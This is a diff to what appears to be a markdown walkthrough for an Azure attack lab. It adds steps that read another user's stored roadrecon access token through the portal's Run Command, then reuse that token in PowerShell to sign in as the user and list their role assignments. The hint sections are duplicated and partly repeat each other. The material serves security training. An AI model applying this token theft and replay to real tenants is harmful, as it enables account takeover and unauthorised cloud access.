@@ -139,10 +139,10 @@ Set-AADIntUserPassword -SourceAnchor "IMMUTABLE_ID" -Password "MYPASS" -Verbose
 user1 uses roadrecon to map attack surfaces in his company's attack surface, the script is executed on a regular basis.
 as we learned, roadrecon writes a file with the access token called "", we can take that access token and steal it!
 
-Run the following command from the Run Command Window in the Azure portal:
+Run the following command on the Win11 VM from the Run Command Window in the Azure portal:
 
 ```powershell
-
+type c:\users\user1.YOURDOMAIN\desktop\.roadtools_auth
 ```
 </details>
 
@@ -151,7 +151,56 @@ Run the following command from the Run Command Window in the Azure portal:
     <summary><b>Hint 1</b></summary>
     
     Using the acquired access token, what can you do?
-    You may use your own PC
+    You may use your own PC / DC VM
+</details>
+
+<details>
+    <summary><b>Hint 2</b></summary>
+    
+    Recon as that user and see what he has access to..
+
+    ```powershell
+    $at = "eyJ"... # what you've obtained from the Run Command hack
+    $userUPN = "user2@YOURDOMAIN.onmicrosoft.com" # you can get it from the access token if you'll parse in https://jwt.io
+
+
+    $tenantId = "YOUR_TENANT_ID" # you can get it here https://entra.microsoft.com/#view/Microsoft_AAD_IAM/TenantOverview.ReactView
+    Connect-AzureAD -AccountId  $userUPN  -TenantId $tenantId -AadAccessToken $at
+    Connect-AzAccount -AccountId  $userUPN  -TenantId $tenantId -AccessToken $at 
+
+    ```
+</details>
+
+<details>
+    <summary><b>Hint 2</b></summary>
+    
+    ```powershell
+    # List current user's Azure Role Assignments using Azure PowerShell
+
+    $userObjectId = "686ebf9d-25..." # get it by parsing the JWT token and looking for the 'oid' field
+    $roleAssignments = Get-AzRoleAssignment -ObjectId $userObjectId
+    $roleAssignments | ForEach-Object {
+        Write-Output "Role: $($_.RoleDefinitionName) - Scope: $($_.Scope)"
+    }
+
+    
+    ```
+</details>
+
+<details>
+    <summary><b>Hint 3</b></summary>
+    
+    ```powershell
+    # we can see that there's a storage account that this user has access to..
+
+    $userObjectId = "686ebf9d-25..." # get it by parsing the JWT token and looking for the 'oid' field
+    $roleAssignments = Get-AzRoleAssignment -ObjectId $userObjectId
+    $roleAssignments | ForEach-Object {
+        Write-Output "Role: $($_.RoleDefinitionName) - Scope: $($_.Scope)"
+    }
+
+    # we can see that there's a storage account that this user has access to..
+    ```
 </details>
 
 
